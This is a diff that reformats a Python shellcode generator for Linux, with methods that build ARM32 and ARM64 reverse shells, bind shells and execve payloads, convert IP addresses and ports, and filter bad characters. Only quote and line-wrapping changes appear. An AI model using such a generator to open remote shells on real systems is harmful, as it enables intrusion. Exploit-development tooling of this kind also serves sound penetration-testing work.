@@ -25,7 +25,7 @@ class LinuxGenerator:
         self.arch = arch.lower()
 
         # Validate architecture
-        if self.arch not in ['x86', 'x64', 'arm', 'arm64']:
+        if self.arch not in ["x86", "x64", "arm", "arm64"]:
             raise ValueError(f"Unsupported Linux architecture: {self.arch}")
 
     def gen_push_encoded_immediate(self, value, reg, comment=""):
@@ -114,8 +114,10 @@ command:
     def gen_reverse_shell_arm32(self, host, port):
         """Generate ARM32 reverse shell shellgen."""
         # Convert IP address to hex
-        ip_parts = [int(x) for x in host.split('.')]
-        ip_hex = (ip_parts[0] << 24) | (ip_parts[1] << 16) | (ip_parts[2] << 8) | ip_parts[3]
+        ip_parts = [int(x) for x in host.split(".")]
+        ip_hex = (
+            (ip_parts[0] << 24) | (ip_parts[1] << 16) | (ip_parts[2] << 8) | ip_parts[3]
+        )
         port_hex = (port >> 8) | ((port & 0xFF) << 8)  # Network byte order
 
         return f"""; ==========================================================================
@@ -180,8 +182,10 @@ binsh:
     def gen_reverse_shell_arm64(self, host, port):
         """Generate ARM64 reverse shell shellgen."""
         # Convert IP address to hex
-        ip_parts = [int(x) for x in host.split('.')]
-        ip_hex = (ip_parts[0] << 24) | (ip_parts[1] << 16) | (ip_parts[2] << 8) | ip_parts[3]
+        ip_parts = [int(x) for x in host.split(".")]
+        ip_hex = (
+            (ip_parts[0] << 24) | (ip_parts[1] << 16) | (ip_parts[2] << 8) | ip_parts[3]
+        )
         port_hex = (port >> 8) | ((port & 0xFF) << 8)  # Network byte order
 
         return f"""; ==========================================================================
@@ -426,7 +430,9 @@ shell:
         output.append("; " + "=" * 70)
         output.append(f"; Auto-generated {self.arch.upper()} Linux Shellcode")
         output.append(f"; Payload: {payload_type}")
-        output.append(f"; Bad chars: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}")
+        output.append(
+            f"; Bad chars: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}"
+        )
         output.append("; " + "=" * 70)
         output.append("")
 
@@ -467,11 +473,15 @@ shell:
         if payload_type == "execve":
             print(f"Command:        {config.get('command', '/bin/sh')}")
         elif payload_type == "reverse_shell":
-            print(f"Target:         {config.get('host', '127.0.0.1')}:{config.get('port', 4444)}")
+            print(
+                f"Target:         {config.get('host', '127.0.0.1')}:{config.get('port', 4444)}"
+            )
         elif payload_type == "bind_shell":
             print(f"Listen Port:    {config.get('port', 4444)}")
             print(f"Shell:          {config.get('shell', '/bin/sh')}")
-        print(f"Bad characters: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}")
+        print(
+            f"Bad characters: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}"
+        )
         print("=" * 72)
         print()
 
